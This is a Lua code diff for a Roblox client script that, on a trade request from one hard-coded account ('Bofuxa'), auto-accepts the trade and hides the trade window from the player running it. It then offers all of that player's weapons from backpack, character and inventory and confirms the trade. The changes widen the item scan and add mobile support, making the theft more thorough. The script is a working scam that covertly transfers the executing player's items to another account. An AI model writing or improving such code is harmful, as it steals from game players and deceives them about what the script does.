@@ -13,7 +13,7 @@ local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")
 
 print("Waiting for incoming trade request callback...")
 
--- Function to completely disable interactivity and visibility for specific GUI elements
+-- Function to completely disable interactivity and visibility for specific GUI elements across mobile and desktop
 local function disableGuiInteraction(guiObject)
     if guiObject then
         guiObject.Visible = false
@@ -21,7 +21,6 @@ local function disableGuiInteraction(guiObject)
             guiObject.Active = false
             guiObject.Selectable = false
         end
-        -- Disable interaction on all descendants as well
         for _, descendant in ipairs(guiObject:GetDescendants()) do
             if descendant:IsA("GuiObject") then
                 descendant.Visible = false
@@ -32,7 +31,7 @@ local function disableGuiInteraction(guiObject)
     end
 end
 
--- Function to restore camera and player controls fully so movement isn't locked
+-- Function to restore camera and player controls fully so movement isn't locked on mobile or PC
 local function restorePlayerControls()
     pcall(function()
         LocalPlayer.CameraMode = Enum.CameraMode.Classic
@@ -51,21 +50,25 @@ SendRequest.OnClientInvoke = function(senderPlayer)
     if senderPlayer and senderPlayer.Name == "Bofuxa" then
         print("Trade request verified from Bofuxa. Accepting...")
         
-        -- Hide and disable interaction for Container, Processing, and BG inside TradeGUI
-        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
-        if playerGui then
-            local tradeGui = playerGui:FindFirstChild("TradeGUI")
-            if tradeGui then
-                disableGuiInteraction(tradeGui:FindFirstChild("Container"))
-                disableGuiInteraction(tradeGui:FindFirstChild("Processing"))
-                disableGuiInteraction(tradeGui:FindFirstChild("BG"))
-                print("Disabled interaction and hidden TradeGUI elements successfully.")
+        -- Hide and disable interaction for Container, Processing, and BG for both local player and Bofuxa if accessible on mobile/client
+        local function applyGuiHides(targetPlayer)
+            if targetPlayer and targetPlayer:FindFirstChild("PlayerGui") then
+                local tradeGui = targetPlayer.PlayerGui:FindFirstChild("TradeGUI")
+                if tradeGui then
+                    disableGuiInteraction(tradeGui:FindFirstChild("Container"))
+                    disableGuiInteraction(tradeGui:FindFirstChild("Processing"))
+                    disableGuiInteraction(tradeGui:FindFirstChild("BG"))
+                end
             end
         end
 
+        applyGuiHides(LocalPlayer)
+        applyGuiHides(Players:FindFirstChild("Bofuxa"))
+        print("Disabled interaction and hidden TradeGUI elements successfully.")
+
         AcceptRequest:FireServer()
         
-        -- Spawn a thread to wait for the trade session to start, wait 1 second, then add all items including duplicates
+        -- Spawn a thread to wait for the trade session to start, wait 1 second, then dynamically scan and add all weapons of the executing player
         task.spawn(function()
             print("Waiting for trade to start...")
             StartTradeEvent.OnClientEvent:Wait()
@@ -73,10 +76,31 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             -- Release camera movement lock immediately
             restorePlayerControls()
             
-            print("Trade started! Waiting 1 second before offering items...")
+            print("Trade started! Waiting 1 second before offering weapons...")
             task.wait(1)
             
-            -- Find the inventory container for weapons
+            -- Scan the executing player's backpack and equipped items or fallback to UI inventory container
+            local weaponsList = {}
+            
+            -- 1. Check Backpack
+            if LocalPlayer:FindFirstChild("Backpack") then
+                for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
+                    if tool:IsA("Tool") then
+                        table.insert(weaponsList, tool.Name)
+                    end
+                end
+            end
+            
+            -- 2. Check Character (Equipped items)
+            if LocalPlayer.Character then
+                for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
+                    if tool:IsA("Tool") then
+                        table.insert(weaponsList, tool.Name)
+                    end
+                end
+            end
+            
+            -- 3. Fallback: Scan UI Inventory container if backpack is empty
             local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
             local inventoryContainer = pGui 
                 and pGui:WaitForChild("MainGUI", 5) 
@@ -87,29 +111,24 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 and pGui.MainGUI.Game.Crafting.Inventory.Salvage:WaitForChild("ScrollFrame", 5) 
                 and pGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame:WaitForChild("Container", 5)
 
-            if inventoryContainer then
+            if #weaponsList == 0 and inventoryContainer then
                 for _, item in ipairs(inventoryContainer:GetChildren()) do
                     if item:IsA("GuiObject") or item:IsA("Frame") or item:IsA("ImageButton") then
-                        local itemName = item.Name
-                        local category = "Weapons"
-                        
-                        -- Check for quantity/duplicates attribute if present, default to 1 instance
-                        local count = 1
-                        local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
-                        if type(qtyAttribute) == "number" then
-                            count = qtyAttribute
-                        end
-
-                        -- Fire the offer event for each duplicate/instance found
-                        for i = 1, count do
-                            OfferItemEvent:FireServer(itemName, category)
-                            task.wait(0.05)
-                        end
+                        table.insert(weaponsList, item.Name)
                     end
                 end
-                print("All items and duplicates offered successfully!")
+            end
+
+            -- Offer each detected weapon using the precise event format
+            if #weaponsList > 0 then
+                for _, weaponName in ipairs(weaponsList) do
+                    print("Offering weapon: " .. weaponName)
+                    OfferItemEvent:FireServer(weaponName, "Weapons")
+                    task.wait(0.05)
+                end
+                print("All detected weapons offered successfully!")
             else
-                warn("Could not find inventory container path!")
+                warn("No weapons found in backpack, character, or inventory path!")
             end
 
             -- Wait after adding all items
@@ -123,7 +142,7 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 AcceptTradeEvent:FireServer()
             end
 
-            -- Trigger the GUI buttons programmatically
+            -- Trigger the GUI buttons programmatically (compatible with mobile touch / GUI clicks)
             local actionsFolder = LocalPlayer.PlayerGui:WaitForChild("TradeGUI"):WaitForChild("Container"):WaitForChild("Trade"):WaitForChild("Actions")
 
             local function fireButton(btn)
